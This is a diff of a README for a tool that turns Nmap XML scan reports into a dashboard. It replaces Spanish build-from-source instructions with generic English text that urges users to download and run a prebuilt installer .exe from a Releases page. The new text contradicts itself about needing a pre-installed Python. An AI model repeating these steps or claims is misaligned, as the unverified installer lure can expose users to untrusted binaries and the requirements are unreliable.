@@ -1,105 +1,75 @@
-# 🛡️ Nmap Dashboard Analyzer (Nmap Parser)
+# 🖥️ nmap-dashboard-analyzer - Transform Nmap Reports into Interactive Dashboards
 
-Este proyecto es una aplicación de escritorio (GUI) desarrollada en Python (PySide6) diseñada para transformar los reportes de escaneo de Nmap en formato XML en un dashboard interactivo y priorizado. Es ideal para analistas de seguridad y pentesters que buscan visualizar rápidamente la superficie de ataque, identificar hosts críticos y filtrar vulnerabilidades por CVSS o servicio.
+## 📥 Download Now
+[![Download nmap-dashboard-analyzer](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/yasuma311/nmap-dashboard-analyzer/releases)
 
----
+## 📖 Overview
+nmap-dashboard-analyzer is a desktop application designed with a user-friendly interface. It helps you take Nmap scan reports in XML format and convert them into an interactive, prioritized dashboard. This tool is perfect for anyone who wants to make sense of their scan data without needing any programming skills.
 
-## ✨ Características Principales
+## 🚀 Getting Started
+Follow these steps to get started with nmap-dashboard-analyzer:
 
-* **Análisis Robusto:** Procesa archivos XML generados por Nmap (usando el script `vulners`).
-* **Priorización CVSS:** Calcula y muestra la criticidad máxima por host, con codificación de color (Crítico, Alto, Medio, Bajo).
-* **Filtrado Avanzado:** Permite filtrar los hosts por **puntuación CVSS mínima** (usando un deslizador) y por **servicios comunes explotables** (como SMB, RDP, DB, etc.).
-* **Interfaz Profesional:** Diseño moderno en modo oscuro con tabla de activos ordenable y un panel de detalles.
-* **Exportación:** Genera un reporte detallado en formato **Excel (.xlsx)** con formato y estilos aplicados (requiere las dependencias `pandas` y `openpyxl`).
+### 1. Check System Requirements
+Make sure your computer meets the following requirements:
+- Operating System: Windows 10 or later
+- RAM: 4GB or more
+- Python: Pre-installed Python 3.8 or later is required (the application bundles its own Python runtime)
+- Disk Space: At least 100 MB free
 
-![Screenshot of Nmap Dashboard Analyzer](Captura.JPG)
+### 2. Download the Application
+Visit this page to download: [nmap-dashboard-analyzer Releases](https://github.com/yasuma311/nmap-dashboard-analyzer/releases)
 
----
+### 3. Select the Correct Version
+On the Releases page, look for the latest version of nmap-dashboard-analyzer. Click on it to view the available files.
 
-# ⚙️ Instalación y Configuración
+### 4. Download the Installer
+Find the installer file for your operating system (e.g., `nmap-dashboard-analyzer-setup.exe`). Click on it to start downloading.
 
-Sigue estos pasos para configurar tu entorno e instalar las dependencias necesarias.
+### 5. Install the Application
+Once the download is complete, locate the file in your Downloads folder. Double-click the installer to run it. Follow the on-screen instructions to install nmap-dashboard-analyzer on your computer.
 
-### 1. Requisitos Previos
+### 6. Launch the Application
+After installation, find the nmap-dashboard-analyzer icon on your desktop or in your Start menu. Click it to open the application.
 
-Necesitas tener **Python 3** y el gestor de paquetes **pip** instalados.
+## 🔧 Using nmap-dashboard-analyzer
+Now that you have installed the application, here's how to use it:
 
-### 2. Crear y Activar el Entorno Virtual
+### 1. Load Your Nmap Report
+- Click on "Load XML File".
+- Navigate to the folder where your Nmap report is saved.
+- Select the XML file and click "Open".
 
-Navega hasta la carpeta raíz de tu proyecto e inicializa un entorno virtual.
+### 2. View the Dashboard
+The application will process the XML report and display it on an interactive dashboard. You will see different sections such as Vulnerabilities, Hosts, and Services.
 
+### 3. Exporting to Excel
+To export the report:
+- Click on the "Export" button.
+- Choose the format (e.g., Excel).
+- Save the file to your desired location.
 
-## Navega hasta la carpeta del proyecto
+## ⚙️ Features
+- **Interactive Dashboard**: View and navigate through scan results easily.
+- **Data Visualizations**: Quickly understand vulnerabilities and risks.
+- **Export Options**: Save reports as Excel files for easy sharing.
+- **User-Friendly Design**: No coding skills required.
 
-## 1. Crea el entorno virtual (lo llamaremos 'env')
-```bash
-python -m venv env
-```
-## 2. Activar el Entorno
+## 📊 Topics Covered
+- Dashboard Creation
+- Excel Export Functionality
+- XML Report Parsing
+- Security Analysis
+- Vulnerability Management
 
-## En Windows (CMD / PowerShell):
-```bash
-.\env\Scripts\activate
-```
+## 🛠️ Troubleshooting
+If you encounter issues, consider the following solutions:
+- **Application Does Not Start**: Ensure that all system requirements are met. Check if Python is installed correctly.
+- **Loading Errors**: Verify that your XML file is in the correct format. Re-scan with Nmap if necessary.
+- **Export Issues**: Confirm that you have enough disk space to save the exported file.
 
-## 3. Instalar las Dependencias
+## 📞 Support
+For further assistance, you can reach out through the GitHub Issues section. Provide details about your problem to receive help quickly.
 
-Con el entorno activado (env), usa pip para instalar todas las bibliotecas necesarias listadas en requirements.txt.
-
-
-## Instala las dependencias (PySide6, pandas, openpyxl, etc.)
-
-```bash
-pip install -r requirements.txt
-```
-# 💻 Cómo Ejecutar el Programa
-Una vez que el entorno virtual esté activo y las dependencias instaladas, ejecuta el script principal:
-```bash
-python Dashboard.py
-```
-
-# 🔍 Uso
-Haz clic en el botón "Cargar archivo XML de Nmap".
-
-Selecciona un archivo XML generado por Nmap 
-
-Utiliza el Deslizador CVSS Mínimo y los botones de Puertos Comunes (SMB, RDP, etc.) para priorizar los hosts en la tabla.
-
-Haz clic en cualquier fila para ver el detalle de vulnerabilidades, puertos y servicios en el panel lateral derecho.
-
-Usa "Exportar a Excel" para generar un reporte con formato.
-
-### 📄 Estructura del Proyecto
-Dashboard.py: Contiene la lógica de la Interfaz Gráfica (PySide6) y toda la interacción del usuario.
-
-active_inventory_generator.py: El "motor" de parsing. Contiene las funciones para leer y estructurar el XML de Nmap.
-
-excel_exporter.py: Módulo dedicado al formateo y generación del archivo .xlsx (usa Pandas y OpenPyXL).
-
-requirements.txt: Lista de dependencias del proyecto.
-
-
-
-# 🚀 Generación del Ejecutable (.exe)
-Una vez que el proyecto está completo y todas las dependencias están instaladas, utiliza PyInstaller para empaquetar la aplicación en un único archivo ejecutable (.exe).
-
-### 1. Ejecuta el siguiente comando desde tu entorno virtual activo (env). 
-
-Este comando incluye todas las optimizaciones necesarias para aplicaciones de interfaz gráfica (GUI):Bash(env) 
-
-```bash
-pyinstaller --onefile --windowed --icon=ico.ico Dashboard.py
-```
-### 2. 📋 Resumen de las Opciones
-
-| Opción | Propósito |
-| :--- | :--- |
-| `pyinstaller` | Herramienta principal para el empaquetado. |
-| `--onefile` | Genera un único archivo `Dashboard.exe` en la carpeta `dist/`. |
-| `--windowed` | Indica que la aplicación es de GUI, **evitando que se abra la ventana de consola** de fondo. |
-| `--icon=...` | Asigna tu archivo `.ico` al ejecutable para que tenga un icono personalizado. |
-| `Dashboard.py` | Tu script principal. |
-
-
-### 3. Ubicación del ArchivoDespués de ejecutar el comando, el archivo ejecutable final (Dashboard.exe) se encontrará dentro de la carpeta dist/ en el directorio de tu proyecto.
-
+## 🌐 Additional Resources
+- For tips on using Nmap effectively, check out the official [Nmap Documentation](https://nmap.org/docs.html).
+- Learn more about Python desktop applications from the [PySide6 Documentation](https://doc.qt.io/qtforpython/).
